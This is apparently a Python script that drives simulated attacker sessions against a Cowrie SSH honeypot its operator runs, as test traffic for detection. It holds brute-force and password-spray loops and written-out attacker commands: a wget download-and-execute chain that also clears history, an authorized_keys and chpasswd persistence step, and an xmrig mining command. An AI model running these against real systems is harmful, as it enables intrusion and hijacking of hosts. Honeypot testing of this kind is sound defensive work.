"""
Controlled test traffic for YOUR OWN VoidSentinel decoy.

Opens real SSH connections to Cowrie and behaves like common attacker
profiles, so every pipeline stage (sanitizer, transport, sessions, rules, ML)
is exercised with genuine Cowrie telemetry. Nothing is written to the
database directly.

These sessions come from addresses listed in VS_DEMO_SOURCE_CIDRS, so the
dashboard tags them "demo" and the ML evaluation excludes them.

Only point this at a honeypot you operate.

    pip install paramiko==3.4.1
    python tools/lab_sessions.py --host 127.0.0.1 --port 2222 --sessions 40
"""
from __future__ import annotations

import argparse
import random
import socket
import time

import paramiko

# Cowrie's default user database rejects these root passwords.
BAD_ROOT_PASSWORDS = ["root", "123456"]
GOOD_PASSWORD = "Winter2026!"
USERNAMES = ["admin", "ubuntu", "test", "oracle", "pi", "postgres", "user", "git"]

PROFILES = {
    "scanner": 5,        # connects, grabs banner, leaves
    "brute": 4,          # repeated failed logins in one connection
    "spray": 2,          # one failure per connection, many connections
    "recon": 5,          # logs in, runs discovery commands
    "dropper": 2,        # download + chmod + execute
    "persistence": 1,    # authorized_keys / crontab
    "miner": 1,          # miner indicators
    "idle_login": 3,     # logs in and leaves
}

RECON = ["uname -a", "whoami", "cat /proc/cpuinfo | grep name | head -n 1", "nproc", "free -m",
         "w", "uptime", "ls -la /tmp", "cat /etc/os-release", "ps aux | head"]


def transport(host: str, port: int, client_version: str) -> paramiko.Transport:
    sock = socket.create_connection((host, port), timeout=10)
    t = paramiko.Transport(sock)
    t.local_version = client_version
    t.start_client(timeout=10)
    return t


def try_password(t: paramiko.Transport, user: str, pw: str) -> bool:
    try:
        t.auth_password(user, pw)
        return t.is_authenticated()
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        return False


def shell(t: paramiko.Transport, commands: list[str], pace: tuple[float, float]):
    chan = t.open_session()
    chan.get_pty()
    chan.invoke_shell()
    time.sleep(0.8)
    for cmd in commands:
        chan.send(cmd + "\n")
        time.sleep(random.uniform(*pace))
        while chan.recv_ready():
            chan.recv(65535)
    chan.send("exit\n")
    time.sleep(0.5)
    chan.close()


def run_profile(name: str, host: str, port: int):
    versions = ["SSH-2.0-libssh2_1.9.0", "SSH-2.0-Go", "SSH-2.0-OpenSSH_8.9p1", "SSH-2.0-paramiko_3.4.1"]
    if name == "spray":
        for user in random.sample(USERNAMES, 6):
            t = transport(host, port, random.choice(versions))
            try_password(t, "root", random.choice(BAD_ROOT_PASSWORDS))
            t.close()
            time.sleep(random.uniform(0.2, 0.6))
        return
    t = transport(host, port, random.choice(versions))
    try:
        if name == "scanner":
            time.sleep(random.uniform(0.1, 1.0))
            return
        if name == "brute":
            for _ in range(random.randint(6, 9)):
                if not t.is_active():
                    break
                try_password(t, "root", random.choice(BAD_ROOT_PASSWORDS))
            return
        # interactive profiles: a couple of failures, then a password Cowrie accepts
        for _ in range(random.randint(0, 2)):
            try_password(t, "root", random.choice(BAD_ROOT_PASSWORDS))
        if not t.is_active() or not try_password(t, "root", GOOD_PASSWORD):
            return
        if name == "idle_login":
            time.sleep(random.uniform(0.5, 2.0))
            return
        if name == "recon":
            shell(t, random.sample(RECON, random.randint(3, 6)), (0.3, 1.2))
        elif name == "dropper":
            shell(t, ["uname -m", "cd /tmp",
                      "wget http://203.0.113.10/bins/x86 -O .x",   # TEST-NET-3 address: never routable
                      "chmod +x .x", "./.x", "rm -f .x", "history -c"], (0.4, 1.0))
        elif name == "persistence":
            shell(t, ["whoami", "mkdir -p ~/.ssh",
                      "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDlabkeyonly lab@test' >> ~/.ssh/authorized_keys",
                      "crontab -l", "echo 'root:NewPass123' | chpasswd"], (0.3, 0.9))
        elif name == "miner":
            shell(t, ["nproc", "lscpu | grep Model",
                      "./xmrig -o stratum+tcp://pool.example.invalid:3333 -u wallet --background"], (0.5, 1.2))
    finally:
        t.close()


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--sessions", type=int, default=40, help="number of profiles to run")
    ap.add_argument("--profile", choices=sorted(PROFILES), help="run only this profile")
    ap.add_argument("--seed", type=int, default=None)
    args = ap.parse_args()
    random.seed(args.seed)
    names, weights = zip(*PROFILES.items())
    for i in range(args.sessions):
        name = args.profile or random.choices(names, weights)[0]
        try:
            run_profile(name, args.host, args.port)
            print(f"[{i + 1}/{args.sessions}] {name}: done")
        except Exception as exc:  # keep going; a decoy dropping us is normal
            print(f"[{i + 1}/{args.sessions}] {name}: {type(exc).__name__}: {exc}")
        time.sleep(random.uniform(0.2, 0.8))


if __name__ == "__main__":
    main()
